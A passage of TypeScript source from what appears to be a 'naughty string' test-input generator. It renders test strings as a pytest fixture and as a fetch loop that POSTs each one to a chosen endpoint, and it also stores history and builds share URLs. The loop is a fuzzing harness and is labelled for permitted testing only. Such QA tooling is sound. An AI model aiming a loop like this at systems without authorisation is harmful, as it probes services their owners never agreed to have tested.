  return lines.join("\n");
}

/** Render as a pytest fixture (parametrize). */
export function renderPytestFixture(strings: NaughtyString[], fixtureName = "naughty_strings"): string {
  const lines: string[] = [
    "# Pytest fixture — auto-generated by UnQTools Naughty String Generator",
    "# Defensive QA use only. Run with: pytest",
    "import pytest",
    "",
    `_${fixtureName}_data = [`,
  ];
  for (const s of strings) {
    // Python repr-ish: we use json.dumps to safely encode the string, which is valid Python (modulo unicode prefix).
    const val = JSON.stringify(s.value);
    const cat = JSON.stringify(s.category);
    const desc = s.description ? JSON.stringify(s.description) : "None";
    lines.push(`    {"category": ${cat}, "value": ${val}, "description": ${desc}},`);
  }
  lines.push("]");
  lines.push("");
  lines.push(`@pytest.mark.parametrize("item", _${fixtureName}_data)`);
  lines.push("def test_naughty_string(item):");
  lines.push("    value = item[\"value\"]");
  lines.push("    assert isinstance(value, str)");
  lines.push("    # TODO: feed `value` into your parser and assert it handles the edge case");
  return lines.join("\n");
}

/** Render as an "send each to my endpoint" loop snippet (defensive — clearly labeled). */
export function renderLoopSnippet(strings: NaughtyString[], endpointVar = "YOUR_ENDPOINT"): string {
  const lines: string[] = [
    "// Defensive loop snippet — auto-generated.",
    "// Run ONLY against systems you own or have explicit permission to test.",
    `const ENDPOINT = ${jsEscape(endpointVar)};`,
    `const payloads: string[] = [`,
  ];
  for (const s of strings) lines.push(`  ${jsEscape(s.value)},`);
  lines.push("];");
  lines.push("");
  lines.push("for (const p of payloads) {");
  lines.push("  try {");
  lines.push("    const res = await fetch(ENDPOINT, {");
  lines.push("      method: 'POST',");
  lines.push("      headers: { 'Content-Type': 'application/json' },");
  lines.push("      body: JSON.stringify({ input: p }),");
  lines.push("    });");
  lines.push("    console.log(JSON.stringify({");
  lines.push("      payload: p,");
  lines.push("      status: res.status,");
  lines.push("      ok: res.ok,");
  lines.push("    }));");
  lines.push("  } catch (e) {");
  lines.push("    console.error('Error for payload:', p, e);");
  lines.push("  }");
  lines.push("}");
  return lines.join("\n");
}

// ---------------------------------------------------------------------------
// History (localStorage)
// ---------------------------------------------------------------------------

const HISTORY_KEY = "unqtools:naughty-string-generator:history";
const HISTORY_MAX = 20;

export function loadHistory(): HistoryEntry[] {
  if (typeof localStorage === "undefined") return [];
  try {
    const raw = localStorage.getItem(HISTORY_KEY);
    if (!raw) return [];
    const arr = JSON.parse(raw) as HistoryEntry[];
    return Array.isArray(arr) ? arr.slice(0, HISTORY_MAX) : [];
  } catch {
    return [];
  }
}

export function saveHistory(entry: HistoryEntry): HistoryEntry[] {
  const next = [entry, ...loadHistory()].slice(0, HISTORY_MAX);
  if (typeof localStorage !== "undefined") {
    try {
      localStorage.setItem(HISTORY_KEY, JSON.stringify(next));
    } catch {
      // ignore
    }
  }
  return next;
}

export function clearHistory(): void {
  if (typeof localStorage === "undefined") return;
  try {
    localStorage.removeItem(HISTORY_KEY);
  } catch {
    // ignore
  }
}

// ---------------------------------------------------------------------------
// Shareable URL (config encoded in fragment — never sent to server)
// ---------------------------------------------------------------------------

export function buildShareUrl(opts: SampleOptions): string {
  const params = new URLSearchParams();
  params.set("seed", String(opts.seed));
  params.set("n", String(opts.count));
  if (opts.categories.length > 0) params.set("cats", opts.categories.join(","));
  if (typeof window === "undefined") return `?${params.toString()}`;
  return `${window.location.origin}${window.location.pathname}#${params.toString()}`;
}

export function parseShareUrl(hash: string): SampleOptions {
  const clean = hash.startsWith("#") ? hash.slice(1) : hash;
  const base: SampleOptions = { ...DEFAULT_SAMPLE_OPTIONS, categories: [] };
  if (!clean) return base;
  const params = new URLSearchParams(clean);
  const seed = Number(params.get("seed"));
  if (Number.isFinite(seed)) base.seed = seed >>> 0;
  const n = Number(params.get("n"));
  if (Number.isFinite(n) && n > 0 && n <= MAX_SAMPLE) base.count = Math.floor(n);
  const catsStr = params.get("cats") ?? "";
  if (catsStr) {
    base.categories = catsStr
      .split(",")
      .filter((c) => (ALL_CATEGORIES as string[]).includes(c)) as NaughtyCategory[];
  }
  return base;
}
